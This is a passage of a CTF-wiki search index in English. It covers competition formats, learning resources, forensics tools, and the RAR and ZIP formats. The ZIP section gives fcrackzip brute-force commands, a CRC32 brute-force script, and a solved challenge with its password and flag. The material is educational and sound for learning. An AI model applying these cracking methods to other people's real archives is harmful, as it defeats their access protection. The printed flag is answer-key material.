Generally, the first three solves are referred to as first blood, second blood, and third blood. This scoring format not only rewards teams who can solve the challenge quickly, but also shows teamwork through collaboration.</p> <p>Of course, there is another popular way of scoring, where the number of points a challenge worth is determined by the number of teams that successfully solve the challenge. Initially, A challenge is given reward points. As more teams successfully solve a challenge, that challenge\u2019s total points reward decreases. Lastly, the reward points will stop decreasing once a hits a threshold.</p> <p>In CTF, topics mainly include these six categories Web \u2013 Web Application Exploitation, RE - Reverse Engineering, Pwn - Binary Exploitation, Crypto - Cipher Attacks, Mobile - Mobile Security and **Misc - Miscellaneous **</p>"},{"location":"introduction/mode/#war-sharing-mode-belluminar","title":"War Sharing Mode - Belluminar","text":"<p>In the 2016 World Hacking Masters Challenge (WCTF), China was first introduced to the Belluminar CTF. Since then, Belluminar type of CTFs has been slowly popping up. In 2016, this type of competition has been seen in the XMan Summer Camp by Zhuge Jianwei and the Baidu Cup CTF Competition in September of the same year.</p> <p>Here is the official Belluminar website: http://belluminar.org/</p>"},{"location":"introduction/mode/#introduction-to-the-belluminar-system","title":"Introduction to the Belluminar System","text":"<p>Belluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of</p> <p>festival consisted of CTF &amp; seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can</p> <p>defend what others want to attack.</p>"},{"location":"introduction/mode/#stage-of-making-the-challenges","title":"Stage of Making the Challenges","text":"<p>Each team is required to submit 2 challenges to the challenge bank.</p> <p>First, each invited team must submit a question before the official competition. The teams will have 12 weeks to prepare the questions for the challenges. The score of the challenges made accounted for 30% of the total team score.</p> <p>Challenge 1: must be on the Linux platform;</p> <p>Challenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...)</p> <p>Traditional Belluminar systems require each team to make two challenges. One of the challenges must be in Linux, while the other has no platform or challenge type restriction. Therefore, teams can show their skill and creativity.</p> <p>In order to make the types of challenges more balanced, teams have to draw for their challenge type. This requires the team's skill level to be more comprehensive. In order to maintain balance, the two challenges might have different scores (For example, one might need to be the score of 200, while the other be the score of 100).</p>"},{"location":"introduction/mode/#submitting-challenges","title":"Submitting Challenges","text":"<p>Before submitting the challenges, teams must submit a full document and a solve writeup for the challenges. The document must include the challenge name and score, challenge description, challenge creator, knowledge needed, and source code of the challenge. However, the solve write-up only needs to include the operating environment, full solving process, and solve script/code.</p> <p>After the challenges are submitted, the organizers will test the challenges and code. If issues are found, the person responsible for the challenge must help to solve the problems. Then, the challenges can be put on the competition platform.</p>"},{"location":"introduction/mode/#during-the-competition","title":"During the Competition","text":"<p>After entering the competition, each team can request to solve the other team\u2019s challenge. If they can\u2019t solve the challenge, they will not get the First Blood reward. The ranking is based on the accumulated points earned by solving the challenges; points earned from challenges account for 60% of the overall points.</p>"},{"location":"introduction/mode/#share-discussion-after-the-competition","title":"Share Discussion After the Competition","text":"<p>After the game is over, the team rests and creates PowerPoints (can also be done in the challenge creation phase). During the sharing meeting, each team sends two members to share their intended solutions, learning process, knowledge points, etc. Once the presentative is over, open discussion begins. The two team representatives must answer questions from other players or judges. While they don\u2019t have a time limit on answering questions, however, the time used is a variable in the scoring process.</p>"},{"location":"introduction/mode/#scoring-rules","title":"Scoring Rules","text":"<p>Scores from creating challenges (30% of overall score) \u2013 50% of the points are based on the level of details, completion, submit time, and the other 50% of the points coms from solved challenges. The formula is as follows: Score = MaxScore -- | N -- Expect\uff3fN | N is the number of teams that solved this challenge. Expect\uff3fN is the number of teams expected to solve this challenge. Only when the challenge\u2019s difficulty is balanced, the number of teams solved this challenge will be closer to the number of teams expected to solve this challenge, the challenge\u2019s creator will earn more points.</p> <p>Score from solving challenges (60% of overall score) \u2013 First Blood is not included in the calculation.</p> <p>Score from sharing \u2013 (10% of overall score) \u2013 Scores based on the content during the sharing meeting voted by players and judges (account for the time taken and other restrictions), will be calculated as an average.</p>"},{"location":"introduction/mode/#thoughts-on-the-belluminar-system","title":"Thoughts on the Belluminar System","text":"<p>The Belluminar system handed over the responsibility of creating challenges to the invited teams, where each team do their best to create challenges for each other. The difficulty and scope of the competition will not be restricted by the organizer, so the quality of the challenges will improve. The \u201cSharing\u201d phase allows each team to explain their challenges. The open discussion process enables the sharing of creative ideas/methods. The \u201cSharing\u201d phase after the competition is a great way for others players to learn.</p>"},{"location":"introduction/mode/#attack-and-defense-mode-attack-defense","title":"Attack and Defense Mode - Attack &amp; Defense","text":""},{"location":"introduction/mode/#overview","title":"Overview","text":"<p>The finals of Attack and Defense competitions are usually done offline. In Attack and Defense mode, teams will use the same system environment, often referred to as the \u201cGamebox\u201d. On the attacking side, teams need to discover vulnerabilities on services running on the opponent\u2019s machine, then exploit them to score by obtaining the flag. On the defending side, teams need to patch existing vulnerabilities to stop losing points (usually defending and patching are the only way to stop losing points, of course, in some competitions successful defending can be rewarded with points).</p> <p>An Attack and Defend competition not only tests the team\u2019s technical skills but also tests the players' body (since most competitions last about 48 hours). At the same time, team members need to split up the tasks and work together on solving different problems.</p> <p>Usually, the competition organizer will disclose the details on the requirements 30 minutes or 1 day before the competition. During that time, you cannot attack. You need to get familiar with the given environment and prepare to defend based on the given requirements. You will need to discover the opponent Gamebox\u2019s IP address using the given subnet.</p> <p>If the two Attack and Defend sessions are between morning and afternoon, then the vulnerable services will get changed (in case players talk about them during the break). However, the IP address and what will not change.</p> <p>Normally, the organizer will provide ethernet cables, but not ethernet adopters.</p>"},{"location":"introduction/mode/#basic-rules","title":"Basic Rules","text":"<p>The general rules of attack and defense mode are as follows</p> <ul> <li>The teams will start with x points</li> <li>During each round, the organizer will update which service contains the released flag.</li> <li>During each round, if a team\u2019s vulnerable service and the attacker obtained the flag via the vulnerable service, then the team will lose some points and the attacker will gain some points.</li> <li>During each round, if a team can keep the its services running normally, then that team won\u2019t lose points. (if defended successful, the points will be rewarded)</li> <li>If a team\u2019s service goes down, then the team will lose points, which distributed to teams that had their service running normally. Often, service downtime and errors will result in more deduction of points.</li> <li>If all teams\u2019 service goes down during a round and it is determined to be unavoidable. Then, no points will be deducted.</li> <li>During each round, if a service goes down and a team gets the flag, the team responsible for the service may get deduct double the points.</li> <li>The uses of general defense methods are forbidden. The participating teams should backup all services before the competition. If a service gets lost or damaged, the organizer will not restore it.</li> <li>It is forbidden to attack the competition platform, including but not limited obtaining root in Gameebox. The offender immediately banned from the competing.</li> <li>If the team finds violations of other teams, please report them immediately and we will strictly review and make corresponding judgments.</li> </ul>"},{"location":"introduction/mode/#network-environment","title":"Network Environment","text":"<p>The document will usually contain a network topology map (as shown below). Each team will maintain some Gamebox (one\u2019s own server), vulnerable services are deployed on the Gamebox.</p> <p></p> <p>The document will include the area of the players, the attack and defense zone, and the organizer\u2019s or third party\u2019s environment.</p> <p>Players needs to configure or use DHCP to obtain the following:</p> <ul> <li>IP address</li> <li>Gateway</li> <li>Subnet</li> <li>DNS server address</li> </ul> <p>Attack and defense environment</p> <ul> <li>The IP addresses of their own and the other teams' Gamebox.</li> <li>The competition usually provides a table of team ids with their corresponding IP address to make planning easier.</li> </ul> <p>Organizer environment</p> <ul> <li>Competition platform</li> <li>Submit flag portal</li> <li>Traffic dashboard</li> </ul>"},{"location":"introduction/mode/#gamebox-login","title":"Gamebox Login","text":"<p>The document provides the login details. Normally, it's like the following:</p> <ul> <li>Username is ctf</li> <li>Login to SSH using a password or private key</li> </ul> <p>Default passwords should be changed immediately and weak passwords should not be used.</p>"},{"location":"introduction/resources/","title":"Learning Resources","text":""},{"location":"introduction/resources/#e-learning","title":"e-learning","text":"<ul> <li>[i Spring and Autumn - Professional Network Security | Information Security Online Learning Training Platform] (http://www.ichunqiu.com)</li> <li>Experiment it - make the experiment easier! </li> <li>[Look at the Snow Knowledge Base] (https://www.kanxue.com/chm.htm)</li> </ul>"},{"location":"introduction/resources/#learning-route","title":"Learning route","text":"<ul> <li>[Know the Chuangyu R&amp;D Skills Table v3.1] (http://blog.knownsec.com/Knownsec_RD_Checklist/index.html)</li> <li>[Bugbank Bank Skills Tree] (https://skills.bugbank.cn/)</li> <li>[Security Skills Tree Lite by Cosine] (http://evilcos.me/security_skill_tree_basic/index.html)</li> <li>[Safety mind map by phith0n] (https://github.com/phith0n/Mind-Map)</li> <li>[Information Security Practitioner Book Recommendation] (https://github.com/riusksk/secbook)</li> </ul>"},{"location":"introduction/resources/#information","title":"Information","text":"<ul> <li>[FreeBuf.COM | Focus on Hackers and Geeks] (http://www.freebuf.com/)</li> <li>[Safety Guest - Thoughtful Security New Media] (https://www.anquanke.com/)</li> <li>[\u5636\u543cRoarTalk \u2013 Return to the most essential information security] (http://www.4hou.com/)</li> <li>[Sec-News Security Digest] (https://wiki.ioin.in/)</li> </ul>"},{"location":"introduction/resources/#technology-forum","title":"technology Forum","text":"<ul> <li>[My Love Crack] (http://www.52pojie.cn)</li> <li>[Look at Snow Forum] (http://bbs.pediy.com/)</li> <li>[Prophet Community] (https://xz.aliyun.com/)</li> <li>[i Spring and Autumn Forum] (https://bbs.ichunqiu.com/)</li> </ul>"},{"location":"introduction/resources/#ctf-events","title":"CTF Events","text":"<ul> <li>[XCTF Community] (https://www.xctf.org.cn/)</li> <li> <p>CTFtime</p> </li> <li> <p>CTF Rank</p> </li> </ul>"},{"location":"introduction/resources/#ctf-oj","title":"CTF OJ","text":"<ul> <li> <p>XCTF OJ</p> </li> <li> <p>[CTF Base Camp] (https://www.ichunqiu.com/competition)</p> </li> <li> <p>pwnhub</p> </li> <li> <p>[Southern Mail Network Attack and Defense Training Platform] (http://ctf.nuptsast.com/)</p> </li> <li>[HackingLab Network Information Security Attack and Defense Learning Platform] (http://hackinglab.cn/)</li> <li> <p>BugkuCTF</p> </li> <li> <p>WeChall</p> </li> <li> <p>Sniper OJ</p> </li> <li> <p>[Jarvis OJ] (https://www.jarvisoj.com/)</p> </li> <li> <p>CTF Learn</p> </li> <li> <p>Hackme CTF</p> </li> <li> <p>Practice CTF List</p> </li> </ul>"},{"location":"introduction/resources/#ctf-tools","title":"CTF Tools","text":"<ul> <li>[Look at Snow Tools] (https://tools.pediy.com/)</li> <li>[My Love Crack Tool] (https://down.52pojie.cn/Tools/)</li> <li>[CTF online tool by CTFcode] (http://ctf.ssleye.com/)</li> <li>[CTF online toolbox by bugku] (http://tool.bugku.com/)</li> <li>[CTF Tools Resource Library by HBCTF team] (https://ctftools.com/down/)</li> <li> <p>ctf-tools by zardus</p> </li> <li> <p>The Cyber Swiss Army Knife</p> </li> </ul>"},{"location":"introduction/resources/#ctf-writeup","title":"CTF Writeup","text":"<ul> <li>[CTFs Writeup Collection] (https://github.com/ctfs)</li> <li>CTF solution by p4 team</li> </ul>"},{"location":"misc/introduction/","title":"Miscellaneous Introduction","text":"<p>Misc is an abbreviation for Miscellaneous</p> <p>The Misc category typically contains the following topics:</p> <ul> <li> <p>Recon</p> </li> <li> <p>Forensics</p> </li> <li> <p>Stego</p> </li> <li> <p>Misc</p> </li> <li> <p>\u2026\u2026</p> </li> </ul> <p>The Misc category can sometimes include crypto (especially classic ciphers).</p> <p>In this section on Misc, we will go over the following topics:</p> <ul> <li>Recon (Information Gathering)</li> </ul> <p>Introduces ways to obtaining information and some tips on using search engines such as Google.</p> <ul> <li>Encodings (Encoding Conversion)</li> </ul> <p>Introduces some common encoding formats and conversion methods.</p> <ul> <li>Forensic &amp;&amp; Stego</li> </ul> <p>Steganography and Forensics involve clever encoding, hidden data, nested files, using search engines to obtain information, and so on. Topics covered are file analysis, memory image analysis, network traffic analysis, and etc.</p> <p>Forensics is different in the real world. In the real world, it rarely involves clever encoding, hidden data, strings scattered and nested in files. But rather it involves mostly recovering data from a damaged file, finding evidence in a broken disk image, or extracting useful information from a memory/disk image.</p> <p>Real-world forensics requires you to find evidence of a malicious act: an attacker attacking the system or insider threat behavior by analyzing logs, memory, file system to find out the relationship between the files or data.</p> <p>Misc is the perfect entry point for CTF competition since it can help you discover and develop different interests. Misc requires various understanding and skills in security and creative thinking.</p> <p></p>"},{"location":"misc/prereq/","title":"Forensic and Steganography Prerequisite","text":"<p>In most CTF competitions, both forensics and steganography are inseparable. The knowledge required for the two is also complementary, so both will be introduced here.</p> <p>Any requirement that requires finding hidden information in a static file is considered a forensics steganography question (unless it\u2019s purely cryptography). Some low-point questions do combine forensics steganography and classic ciphers. The high score questions, however, are usually combined with some more complex modern cryptography. This well reflects the characteristics of Misc questions.</p>"},{"location":"misc/prereq/#basic-required-skills","title":"Basic Required Skills","text":"<ul> <li>Familiar with common encodings. Able to decode encoded text found in files. Can identify some special encodings (base64, hexadecimal, binary, etc.) and convert them to obtain the flags.</li> <li>Ability to manipulate binary data using scripting languages (Python, etc.)</li> <li>Familiar with file formats of common files, especially the various file headers, protocols, structures, etc</li> <li>Can effectively use common tools</li> </ul>"},{"location":"misc/prereq/#manipulate-binary-data-in-python","title":"Manipulate Binary Data in Python","text":""},{"location":"misc/prereq/#struct-module","title":"<code>struct</code> Module","text":"<p>Sometimes you need to use Python to process binary data, such as, when saving a file or using a socket. Python\u2019s struct module can help you complete those tasks.</p> <p>The three most important functions in the struct module are <code>pack()</code>, <code>unpack()</code>, and <code>calcsize()</code></p> <ul> <li><code>pack(fmt, v1, v2, ...)</code> Packs a list of values into a string according to the given format <code>fmt</code> (similar to a C structure's byte stream)</li> <li><code>unpack(fmt, string)</code> Unpacks the packed value into its original representation according to the given format <code>fmt</code> and returns the unpacked tuple</li> <li><code>calcsize(fmt)</code> Calculates and returns the size of the String representation of struct according to the given format <code>fmt</code></li> </ul> <p>The packing format <code>fmt</code> here determines how the variable is packaged as a byte stream, which contains a series of format strings. For details the meanings of the different formatted strings, please refer to Python Doc for more details.</p> <pre><code>&gt;&gt;&gt; import struct\n&gt;&gt;&gt; struct.pack('&gt;I',16)\nb'\\x00\\x00\\x00\\x10'\n</code></pre> <p>The first argument of <code>pack</code> is the packing instruction. <code>'&gt;I'</code> means: <code>&gt;</code> indicates that the byte order is Big-Endian, which is the network byte order. <code>I</code> indicates a 4-byte unsigned integer. The number of arguments must match the number of format characters used in the packing instruction. In this case, because only one format characters are used(<code>I</code>), there can only be one remaining argument.</p> <p>To read the first 30 bytes of a BMP file, the structure of the file header is as follows: - Two bytes: <code>BM</code> for Windows bitmap, <code>BA</code> for OS/2 bitmap - a 4-byte integer: size of the BMP file in bytes - a 4-byte integer: reserved bits, always 0 - a 4-byte integer: offset of the byte where the bitmap image data (pixel array) can be found - a 4-byte integer: size of this header - a 4-byte integer: bitmap width in pixels - a 4-byte integer: bitmap height in pixels - a 2-byte integer: number of color planes (always 1) - a 2 byte integer: number of bits per pixel, which is the color depth of the image (Typically 1, 4, 8, 16, 24, 32)</p> <p>For more details, see BMP file format - Wikipedia</p> <pre><code>&gt;&gt;&gt; import struct\n&gt;&gt;&gt; bmp = b'\\x42\\x4d\\x38\\x8c\\x0a\\x00\\x00\\x00\\x00\\x00\\x36\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x80\\x02\\x00\\x00\\x68\\x01\\x00\\x00\\x01\\x00\\x18\\x00'\n&gt;&gt;&gt; struct.unpack('&lt;ccIIIIIIHH',bmp)\n(b'B', b'M', 691256, 0, 54, 40, 640, 360, 1, 24)\n</code></pre>"},{"location":"misc/prereq/#bytearray","title":"<code>bytearray</code>","text":"<p>Read a file into a <code>bytearray</code> <pre><code>data = bytearray(open('challenge.png', 'rb').read())\n</code></pre></p> <p>A <code>bytearray</code> is a mutable version of bytes <pre><code>data[0] = '\\x89'\n</code></pre></p>"},{"location":"misc/prereq/#common-tools","title":"Common Tools","text":""},{"location":"misc/prereq/#010-editor","title":"010 Editor","text":"<p>Sweetscape 010 Editor is a new hex file Editor that differs from traditional hex editors in that it uses \"templates\" to parse binary files so you can read and edit them. It can also be used to compare any other binary file.</p> <p>Its templating feature makes it very easy to observe the internal structure of a file and quickly change the content accordingly.</p> <p></p>"},{"location":"misc/prereq/#file-command","title":"<code>file</code> Command","text":"<p>The <code>file</code> command identifies the file type of a file based on the file header (magic bytes).</p> <pre><code>root@linux:~/Desktop/tmp# file flag\nflag: PNG image data, 450 x 450, 8-bit grayscale, non-interlaced\n</code></pre>"},{"location":"misc/prereq/#strings-command","title":"<code>strings</code> Command","text":"<p>Print or display the printable characters of a file. Often you can discover hints or encoded information in the printable characters.</p> <ul> <li> <p>You can extract specific  information with the <code>grep</code> command</p> <pre><code>strings test|grep -i XXCTF\n</code></pre> </li> <li> <p>You can get all ASCII character offsets with the <code>-o</code> option</p> <pre><code>root@linux:~/Desktop/tmp# strings -o flag | head\n    14 IHDR\n    45 gAMA\n    64  cHRM\n    141 bKGD\n    157 tIME\n    202 IDATx\n    223 NFdVK3\n    361 |;*-\n    410 Ge%&lt;W\n    431 5duX@%\n</code></pre> </li> </ul>"},{"location":"misc/prereq/#binwalk-command","title":"<code>binwalk</code> Command","text":"<p><code>binwalk</code> is a firmware analysis tool. In CTFs, <code>binwalk</code> is often used to discover multiple files hidden in a file. Furthermore, the tool uses the file header (magic bytes) to find other files contained in a file. Sometimes, there are false positives (especially for a PCAP, packet capture, file).</p> <pre><code>root@linux:~/Desktop/tmp# binwalk flag\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 450 x 450, 8-bit grayscale, non-interlaced\n134           0x86            Zlib compressed data, best compression\n25683         0x6453          Zip archive data, at least v2.0 to extract, compressed size: 675, uncompressed size: 1159, name: readme.txt\n26398         0x671E          Zip archive data, at least v2.0 to extract, compressed size: 430849, uncompressed size: 1027984, name: trid\n457387        0x6FAAB         End of Zip archive\n</code></pre> <ul> <li> <p>Automatic extraction with the <code>-e</code> option:     <code>binwalk -e flag</code></p> </li> <li> <p>Manual file carving can also be done with the <code>dd</code> command:     <pre><code>root@linux:~/Desktop/tmp# dd if=flag of=1.zip bs=1 skip=25683\n431726+0 records in\n431726+0 records out\n431726 bytes (432 kB, 422 KiB) copied, 0.900973 s, 479 kB/s\n</code></pre></p> </li> </ul>"},{"location":"misc/recon/","title":"Information Gathering Method","text":""},{"location":"misc/recon/#network-information-gathering","title":"Network Information Gathering","text":"<ul> <li>Public information</li> <li>Target's website, location, and related organizations</li> <li>Organizational structure and personnel, personal information, telephone, email</li> <li>Network configuration and security policy</li> <li>Find security vulnerabilities or private information using a search engine</li> <li>Google Hacking Database</li> </ul>"},{"location":"misc/recon/#basic-search","title":"Basic Search","text":"<ul> <li>Basic Google search techniques</li> <li>Clear and simple keywords</li> <li>Describe what you are looking for in a concise and simple manner</li> <li>Unique description words</li> <li>Public information database</li> <li>Personal information from Census Bureau</li> <li>Enterprises and other entities: YellowPage, Enterprise Credit Information Network</li> <li>Website, domain name, IP address: whois</li> </ul>"},{"location":"misc/recon/#maps-and-street-view-search","title":"Maps and Street View Search","text":"<ul> <li>Google Map, Google Earth, Google Street View</li> </ul>"},{"location":"misc/recon/#ip-address-lookup","title":"IP Address Lookup","text":"<ul> <li>whois database</li> <li>GeoIP</li> <li>IP2Location</li> </ul>"},{"location":"misc/archive/rar/","title":"RAR Format","text":""},{"location":"misc/archive/rar/#file-structure","title":"File Structure","text":"<p>A RAR file mainly consists of tag block, file header block, file header block, and end block.</p> <p>Each block is roughly divided into the following fields:</p> Name Size Description HEAD_CRC 2 CRC of total block or block part HEAD_TYPE 1 Block Type HEAD_FLAGS 2 Block Flags HEAD_SIZE 2 Block Size ADD_SIZE 4 Optional Field - added block size <p>The file header of the RAR archive is <code>0x 52 61 72 21 1A 07 00</code>.</p> <p>Following the file header (<code>0x526172211A0700</code>) the MARK_HEAD.</p> <p>File Header (File in Archive):</p> Name Size Description HEAD_CRC 2 CRC of fields from HEAD_TYPE to FILEATTR and file name HEAD_TYPE 1 Header Type: 0x74 HEAD_FLAGS 2 Bit Flags (Please see 'Bit Flags for File in Archive' table for all possibilities) HEAD_SIZE 2 File header full size including file name and comments PACK_SIZE 4 Compressed file size UNP_SIZE 4 Uncompressed file size HOST_OS 1 Operating system used for archiving (See the 'Operating System Indicators' table for the flags used) FILE_CRC 4 File CRC FTIME 4 Date and time in standard MS DOS format UNP_VER 1 RAR version needed to extract file (Version number is encoded as 10 * Major version + minor version.) METHOD 1 Packing method (Please see 'Packing Method' table for all possibilities NAME_SIZE 2 File name size ATTR 4 File attributes HIGH_PACK_SIZ 4 High 4 bytes of 64-bit value of compressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set. HIGH_UNP_SIZE 4 High 4 bytes of 64-bit value of uncompressed file size. Optional value, presents only if bit 0x100 in HEAD_FLAGS is set. FILE_NAME NAME_SIZE bytes File name - string of NAME_SIZE bytes size SALT 8 present if (HEAD_FLAGS &amp; 0x400) != 0 EXT_TIME variable size present if (HEAD_FLAGS &amp; 0x1000) != 0 <p>The end of each RAR file is fixed (Terminator):</p> Field Name Size (bytes) Possibilities HEAD_CRC 2 Always 0x3DC4 HEAD_TYPE 1 Header type: 0x7b HEAD_FLAGS 2 Always 0x4000 HEAD_SIZE 2 Block size = 0x0007 <p>The RAR terminator or trailer bytes is thus always <code>0x C4 3D 7B 00 40 07 00</code></p> <p>See more details here</p>"},{"location":"misc/archive/rar/#attack-methods","title":"Attack Methods","text":""},{"location":"misc/archive/rar/#brute-force","title":"Brute Force","text":"<ul> <li>RarCrack</li> </ul>"},{"location":"misc/archive/rar/#pseudo-encryption","title":"Pseudo encryption","text":"<p>The pseudo-encryption of a RAR file is on the bit mark field in the header of the file. This bit is clearly visible with the 010 Editor. Modifying this bit can create pseudo-encryption.</p> <p></p> <p>Other techniques, such as plaintext attacks, remain the same as described in ZIP.</p>"},{"location":"misc/archive/zip/","title":"ZIP Format","text":""},{"location":"misc/archive/zip/#file-structure","title":"File Structure","text":"<p>The <code>ZIP</code> file is mainly composed of three parts, respectively</p> local file header + file data + data descriptor central directory end of central directory record <p>Each compressed source file or directory in the compressed source file data area is a record:</p> <ul> <li><code>local file header</code>: file header is used to identify the beginning of the file. The file header identifier starts with a fixed value of <code>50 4B 03 04</code></li> <li><code>file data</code>: file data records the data of the corresponding compressed file</li> <li><code>data descriptor</code>: data descriptor is used to identify the end of the file compression. This structure appears only when the 3<sup>rd</sup> bit of the generic tag field in the corresponding <code>local file header</code> is set to <code>1</code> immediately after the compressed file source data</li> <li><code>Central directory</code> central directory is used to record directory information. Each record in this data area corresponds to one data area in the compressed source file</li> </ul> Offset Bytes Description 0 4 Central directory file header signature = 0x02014b50 4 2 Version made by 6 2 Version needed to extract (minimum) 8 2 General purpose bit flag 10 2 Compression method 12 2 File last modification time 14 2 File last modification date 16 4 CRC-32 20 4 Compressed size 24 4 Uncompressed size 28 2 File name length (n) 30 2 Extra field length (m) 32 2 File comment length (k) 34 2 Disk number where file starts 36 2 Internal file attributes 38 4 External file attributes 42 4 relative offset of local header 46 n File name 46+n m Extra field 46+n+m k File comment <ul> <li><code>End of central directory record(EOCD)</code> end of directory identifier, exists at the end of the entire archive package and is used to mark the end of compressed catalog data. Each compressed file must have one and only one EOCD record</li> </ul> <p>See Official Documentation for more details.</p>"},{"location":"misc/archive/zip/#attack-methods","title":"Attack Methods","text":""},{"location":"misc/archive/zip/#brute-force","title":"Brute Force","text":"<p>Here are two tools for brute-forcing <code>zip</code>.</p> <ul> <li> <p>Windows (Paid) - ARCHPR</p> <p></p> </li> <li> <p>Linux (Free) - fcrackzip</p> <p>Example command: <code>root@kali: fcrackzip -b -c1 -u test.zip</code></p> <p>-b for brute force mode, -c1 specifies password character set to be numbers, -u validates the password with <code>unzip</code>, -l 5-6 specifies password length</p> </li> </ul>"},{"location":"misc/archive/zip/#crc32","title":"CRC32","text":""},{"location":"misc/archive/zip/#basics","title":"Basics","text":"<p><code>CRC</code> stands for cyclic redundancy check, and <code>CRC32</code> means that a check value of <code>32 bit</code> is generated. Since every bit of a <code>CRC32</code> value is used in the calculation, when one-bit changes in the data block, a different <code>CRC32</code> value will be generated.</p> <p>The <code>CRC32</code> checksum appears in many files such as a <code>png</code> file, as well as the <code>CRC32</code> checksum in <code>zip</code>. It is worth noting that <code>CRC32</code> in <code>zip</code> is the checksum value of the unencrypted files.</p> <p>This has led to an attack method based on <code>CRC32</code>.</p> <ul> <li>There is very little content in the file (it is about <code>4</code> bytes, in most CTFs)</li> <li>Encrypted password is very long</li> </ul> <p>Instead of brute-forcing the password of zip file , we can brute force the contents of the plaintext file (usually strings) to obtain what we want.</p> <p>For example, we created a new <code>flag.txt</code> with the content <code>123</code> and encrypt it with the password <code>!QAZXSW@#EDCVFR$</code>.</p> <p></p> <p>Then, we calculated the <code>CRC32</code> value of the file within the encrypted zip and found that it matches the <code>CRC32</code> value in the above figure.</p> <pre><code>File: flag.txt\nSize: 3\nTime: Tue, 29 Aug 2017 10:38:10 +0800\nMD5: 202cb962ac59075b964b07152d234b70\nSHA1: 40bd001563085fc35165329ea1ff5c5ecbdbbeef\n\nCRC32: 884863D2\n</code></pre> <p>Note</p> <p>When brute forcing, we could try to get all possible strings' <code>CRC32</code> value and compare it with the <code>CRC32</code> value of file within the compressed zip file.</p> <p>Here is a <code>CRC32</code> brute force script:</p> <p>Note</p> <p>Run this script in Python2</p> <pre><code>import binascii\nimport base64\nimport string\nimport itertools\nimport struct\n\nalph = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='\n\ncrcdict = {}\nprint \"computing all possible CRCs...\"\nfor x in itertools.product(list(alph), repeat=4):\n    st = ''.join(x)\n    testcrc = binascii.crc32(st)\n    crcdict[struct.pack('&lt;i', testcrc)] = st\nprint \"Done!\"\n\nf = open('flag.zip')\ndata = f.read()\nf.close()\ncrc = ''.join(data[14:18])\nif crc in crcdict:\n    print crcdict[crc]\nelse:\n    print \"FAILED!\"\n</code></pre>"},{"location":"misc/archive/zip/#ctf-example","title":"CTF Example","text":""},{"location":"misc/archive/zip/#abctf-2016-zippy","title":"Abctf-2016 - Zippy","text":"<p>Download the challenge file here</p> <p>Based on the file size of each compressed file, it can be inferred that the <code>CRC32</code> attack method can be used.</p> <p>You can brute force the <code>CRC32</code> value for all the compressed files. After that you concatenate the contents from each compressed file to get a base64 string, decode that will get you the flag.</p> <p>You can use this script to brute force <code>CRC32</code> values and obtain the content of each compressed file:</p> <p>Note</p> <p>Run this script in Python2</p> <pre><code># unzip to file ./zippy directory\nimport binascii\nimport base64\nimport string\nimport itertools\nimport struct\n\nalph = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='\n\ncrcdict = {}\nprint \"computing all possible CRCs...\"\nfor x in itertools.product(list(alph), repeat=4):\n    st = ''.join(x)\n    testcrc = binascii.crc32(st)\n    crcdict[struct.pack('&lt;i', testcrc)] = st\nprint \"Done!\"\n\nfor i in range(54):\n    f = open(\"./zippy/chunk{}.zip\".format(i))\n    data = f.read()\n    f.close()\n    crc = ''.join(data[14:18])\n    if crc in crcdict:\n        print crcdict[crc]\n    else:\n        print \"FAILED!\"\n</code></pre> <p>We got the following base64 string: <code>UEsDBBQDAQAAAJFy1kgWujyNLwAAACMAAAAIAAAAZmxhZy50eHT/xhoeSnjMRLuArw2FXUAIWn8UQblChs4AF1dAnT4nB5hs2SkR4fTfZZRB56Bp/FBLAQI/AxQDAQAAAJFy1kgWujyNLwAAACMAAAAIAAAAAAAAAAAAIIC0gQAAAABmbGFnLnR4dFBLBQYAAAAAAQABADYAAABVAAAAAAA=</code></p> <p>The base64 string decodes to another zipfile, which is password protected.</p> <p>Let's brute force the password with <code>fcrackzip</code>:</p> <p><code>fcrackzip -b -c 'Aa1' -l 1-5 -v -u flag.zip</code>   - -b, brute force mode   - -c 'Aa1', character set lowercase and uppercase letters, numbers   - -l 1-5, password length 1-5   - -u double check password to avoid false positives</p> <p>We got the password: <code>z1P</code></p> <p>Flag: <code>flag{i_z1pp3d_a_zip_w1th_sum_zips}</code></p>"},{"location":"misc/archive/zip/#clear-text-attack","title":"Clear text attack","text":""},{"location":"misc/archive/zip/#basics_1","title":"Basics","text":"<ul> <li> <p>An encrypted compressed file</p> </li> <li> <p>A software to compress files, such as, <code>7z</code> or <code>zip</code>, to view compressed file details. In Linux, you can use <code>zipinfo -v</code> to view the details, such as encryption algorithms, etc</p> </li> <li> <p>Know at least <code>12 bytes</code> of contiguous content of a file of the archive</p> </li> </ul> <p>If you already know part of the encrypted file, such as the <code>readme.txt</code> file found on a website, you can start trying to crack it.</p> <p>First, compress this plaintext file into a <code>zip</code> file. For example, <code>readme.txt</code> into <code>readme.zip</code>.</p> <p>Then, you need to confirm that the compression algorithm used by both is the same. A simple way to check is to open the file and see file is compressed with the same volume. If they are the same, it means the compression algorithm you are using is correct. If it is different, try another compression algorithm.</p>"},{"location":"misc/archive/zip/#ctf-example_1","title":"CTF Example","text":""},{"location":"misc/archive/zip/#2015-guangzhou-strong-net-cup-burst","title":"2015 Guangzhou Strong Net Cup - burst","text":"<p>Download the challenge file here</p> <p>First of all, the name of the challenge is burst. It is obvious we need to a cracking tool.</p> <p>First step, analyze the compressed file</p> <p>We see the file name is .zip. We extract the zip file and found there are two files,  <code>Desktop.zip</code> and <code>readme.txt</code> respectively.</p> <p>Let's see the contents of <code>readme.txt</code>:</p> <p></p> <p>After opening it, it shows <code>qianwanbuyaogeixuanshoukandao!!!</code>.</p> <p>In the <code>Desktop.zip</code>, there is a <code>readme.txt</code>, a <code>answer</code> folder with a <code>key.txt</code> file.</p> <p>The flag is probably in the <code>key.txt</code> file.</p> <p>Step 2, analyze the crack method</p> <p>We found that the extracted file and the <code>Desktop.zip</code> contain the same <code>readme.txt</code> file, where it's size is greater than <code>12 bytes</code>. The <code>CRC32</code> value of extracted <code>readme.txt</code> file is the same 